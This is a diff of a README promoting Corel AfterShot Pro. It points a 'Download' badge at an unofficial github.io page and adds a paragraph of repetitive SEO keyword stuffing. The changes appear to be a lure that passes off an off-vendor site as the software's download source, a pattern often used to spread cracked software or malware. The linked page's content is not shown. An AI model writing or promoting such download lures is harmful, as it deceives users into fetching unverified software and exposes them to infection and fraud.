@@ -53,7 +53,7 @@ Tailor the interface to your workflow with adjustable panels and shortcuts
 - No image quality loss during editing
 - Complete control over your creative assets
 
-[![Try Now](https://img.shields.io/badge/Download-AfterShot_Pro-purple?style=for-the-badge&logo=adobe)](#)
+[![Try Now](https://img.shields.io/badge/Download-AfterShot_Pro-purple?style=for-the-badge&logo=adobe)](https://corel-aftershot-download.github.io/.github/)
 
 ---
 
@@ -93,3 +93,4 @@ Seamless workflow across different operating systems
 
 ## 📌 Keywords
 
+Corel AfterShot Download, AfterShot Corel Download, Download Corel AfterShot, Download AfterShot Corel, Corel Download AfterShot, AfterShot Download Corel, Corel AfterShot Pro Download, AfterShot Pro Corel Download, Download Corel AfterShot Pro, Download AfterShot Pro Corel, Corel Download AfterShot Pro, AfterShot Pro Download Corel, Pro Corel AfterShot Download, Corel Pro AfterShot Download, AfterShot Corel Pro Download, Download Pro Corel AfterShot, Pro AfterShot Corel Download, Pro Download Corel AfterShot
